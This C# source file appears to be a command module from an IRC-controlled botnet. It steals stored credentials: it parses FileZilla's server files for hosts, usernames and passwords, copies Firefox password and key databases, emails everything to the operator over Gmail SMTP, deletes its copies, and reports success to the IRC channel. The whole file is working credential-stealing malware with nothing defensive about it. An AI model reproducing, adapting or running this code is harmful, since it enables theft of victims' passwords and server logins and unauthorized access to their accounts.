using System;
using System.Text;
using System.IO;
using System.Net.Mail;
using System.Net;
using System.Xml;

namespace mstsc.Aries.Commands
{
    sealed class Firefox
    {
        StringBuilder FileZillaInfo = new StringBuilder();
        public Firefox()
        {
            string info = getsignon();
            if (info == "true")
            { Main.Instance.IRCClient.MessageCurrentChannel("{Firefox} Firefox/Filezilla passwords sent"); }
            else
            { Main.Instance.IRCClient.MessageCurrentChannel("{Firefox} An error has occurred:" + info); }
        }

        private string getsignon()
        {
            Antis.Config botsettings = new Antis.Config();
            SmtpClient Client = new SmtpClient("smtp.gmail.com", 25);
            Client.EnableSsl = true;
            Client.Credentials = new NetworkCredential(botsettings.Anti(Antis.Config.AntiType.GmailUser), botsettings.Anti(Antis.Config.AntiType.GmailPass));
            MailMessage msg = new MailMessage();
            msg.To.Add(new MailAddress(botsettings.Anti(Antis.Config.AntiType.GmailUser)));
            msg.From = new MailAddress(botsettings.Anti(Antis.Config.AntiType.GmailUser));
            msg.Subject = Environment.MachineName + "//" + Environment.UserName;

            try
            {
                //Check Filezilla
                string Path = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\FileZilla\\";

                if (Directory.Exists(Path))
                { //Parse the XML files & get the login info from both files if they exist
                    if (File.Exists(Path + "recentservers.xml"))
                    { getxmlinfo(Path + "recentservers.xml"); }
                    else { FileZillaInfo.Append("recentservers.xml not found\n"); }

                    if (File.Exists(Path + "sitemanager.xml"))
                    { getxmlinfo(Path + "sitemanager.xml"); }
                    else { FileZillaInfo.Append("sitemanager.xml not found\n"); }
                }
                else
                { FileZillaInfo.Append("Filezilla not found\n"); }


                bool NoFirefox = false;//, NoFilezilla = false;
                try
                {
                    //Check Firefox
                    string DefaultTempP = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\Mozilla\\Firefox\\Profiles\\";
                    string[] FolderArray = Directory.GetDirectories(DefaultTempP);
                    if (!Directory.Exists(DefaultTempP)) { NoFirefox = true; }

                    int i = new Random().Next(0, 10000);
                    if (!NoFirefox)
                    {
                        //Go through each folder, copy the files to a new name & attach them to the email. 
                        //ex: signons.sqlite -> 148signons.sqlite
                        foreach (string folder in FolderArray)
                        {
                            string[] filearray = Directory.GetFiles(folder);
                            foreach (string file in filearray)
                            {
                                if (file.Contains("signon") | file.Contains("key3") & !file.Contains("classifier") | file.Contains("cert8"))
                                {
                                    File.Copy(file, folder + "\\" + i + System.IO.Path.GetFileName(file));
                                    msg.Attachments.Add(new Attachment(folder + "\\" + i + System.IO.Path.GetFileName(file)));
                                }
                            }
                            i++;
                        }
                    }
                    else
                    { FileZillaInfo.Append("\n Firefox not found"); }


                    //Delete copied files
                    if (!NoFirefox)
                    {
                        foreach (string folder in FolderArray)
                        {
                            string[] filearray = Directory.GetFiles(folder);
                            foreach (string file in filearray)
                            {
                                if (file.Contains("signon") | file.Contains("key3") & !file.Contains("classifier") | file.Contains("cert8"))
                                { //Delete if the file name starts with a number
                                    if (IsNumeric(System.IO.Path.GetFileName(file)[0]))
                                    {
                                        File.Delete(file);
                                    }
                                }
                            }
                        }
                    }
                    GC.Collect();
                    GC.WaitForPendingFinalizers();
                    GC.Collect();
                    //return "true";
                }
                catch (Exception Ex) { FileZillaInfo.Append(Ex.Message); }
            }
            catch (Exception ex1) { FileZillaInfo.Append(ex1.Message); }

            msg.Body = FileZillaInfo.ToString();
            Client.Send(msg);
            msg.Dispose();
            FileZillaInfo.Remove(0, FileZillaInfo.Length);
            return "true";
        }

        /// <summary>
        /// Parse the XML file
        /// </summary>
        /// <param name="FilePath">Location of the file</param>
        private void getxmlinfo(string FilePath)
        {
            try
            {
                using (XmlReader MyReader = XmlReader.Create(FilePath))
                {
                    while (MyReader.Read())
                    {
                        if ((MyReader.NodeType == XmlNodeType.Element) & (MyReader.Name == "Server"))
                        {
                            FileZillaInfo.Append(FilePath + '\n');
                            FileZillaInfo.Append("Host: " + ParseAuthor(MyReader, "Host") + '\n');
                            FileZillaInfo.Append("Port: " + ParseAuthor(MyReader, "Port") + '\n');
                            FileZillaInfo.Append("User: " + ParseAuthor(MyReader, "User") + '\n');
                            FileZillaInfo.Append("Pass: " + ParseAuthor(MyReader, "Pass") + '\n');
                            FileZillaInfo.Append('\n');
                        }
                    }
                    if (FileZillaInfo.Length == 0) { FileZillaInfo.Append("No websites found in " + Path.GetFileName(FilePath) + '\n'); }
                }
            }
            catch (Exception) { FileZillaInfo.Append("Error retreiving FileZilla account info from " + Path.GetFileName(FilePath) + '\n'); }
        }

        /// <summary>
        /// Parse XML files
        /// </summary>
        /// <param name="MyReader">XMLReader</param>
        /// <param name="ReadString">XML to parse</param>
        private string ParseAuthor(XmlReader MyReader, string ReadString)
        {
            try { MyReader.ReadToFollowing(ReadString); return MyReader.ReadString(); }
            catch (Exception) { return ""; }
        }

        private static bool IsNumeric(object Expression)
        {
            double retNum;
            return Double.TryParse(Convert.ToString(Expression), System.Globalization.NumberStyles.Any, System.Globalization.NumberFormatInfo.InvariantInfo, out retNum);
        }

    }
}
